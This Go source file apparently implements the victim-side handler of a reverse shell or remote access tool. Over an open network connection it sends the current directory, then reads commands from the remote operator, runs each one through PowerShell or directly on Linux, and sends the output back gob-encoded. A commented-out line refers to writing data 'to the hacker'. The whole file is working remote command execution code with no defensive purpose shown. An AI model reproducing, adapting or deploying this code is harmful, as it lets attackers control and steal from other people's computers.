package ExecuteSystemCommandWindows

import (
	"bufio"
	"bytes"
	"encoding/gob"
	"fmt"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strings"
)

type Command struct {
	CmdOutput string
	CmdError  string
}

func ExecuteCommandWindows(connection net.Conn) (err error) {

	pwd, err := os.Getwd()
	if err != nil {
		//fmt.Println("[-] Can't get present directory")
	}
	//fmt.Println(pwd)

	pwd_raw := pwd + "\n"
	nbyte, err := connection.Write([]byte(pwd_raw))
	if nbyte == nbyte {
	}
	//fmt.Println("[+] ", nbyte, " was written")

	reader := bufio.NewReader(connection)

	commandloop := true

	for commandloop {
		raw_user_input, err := reader.ReadString('\n')
		if err != nil {
			//fmt.Println(err)
			continue
		}
		user_input := strings.TrimSuffix(raw_user_input, "\n")

		if user_input == "4" || user_input == "1" ||
			user_input == "2" || user_input == "3" || user_input[0:3] == "cd " ||
			user_input == "5" || user_input == "99" || user_input == "stop" {
			/*user_commnad_arr := strings.Split(raw_user_input, " ")

			if len(user_commnad_arr) > 1 {
				dir2move := user_commnad_arr[1]
				println(dir2move)
				err = os.Chdir(dir2move)
				if err != nil {
					fmt.Println("[-] Unable to change directory")
				}
			}

			pwd, err = os.Getwd()
			nbytes, err := connection.Write([]byte(pwd + "\n"))
			if err != nil {
				fmt.Println(err)
			}
			fmt.Println("[+] Pwd written to the hacker, ", nbytes)*/
			commandloop = false
		} else {
			//fmt.Println("[+] User Command: ", user_input)

			var cmd_instance *exec.Cmd

			if runtime.GOOS == "windows" {
				//execute here
				cmd_instance = exec.Command("powershell.exe", "/C", user_input)
			} else {
				//linux execute here
				cmd_instance = exec.Command(user_input)
			}

			var output bytes.Buffer
			var commandErr bytes.Buffer

			cmd_instance.Stdout = &output
			cmd_instance.Stderr = &commandErr

			err = cmd_instance.Run()
			if err != nil {
				fmt.Println(err)
			}

			cmdStruct := &Command{}

			cmdStruct.CmdOutput = output.String()
			cmdStruct.CmdError = commandErr.String()

			encoder := gob.NewEncoder(connection)
			err = encoder.Encode(cmdStruct)

			if err != nil {
				fmt.Println(err)
				continue
			}
		}
	}

	return
}
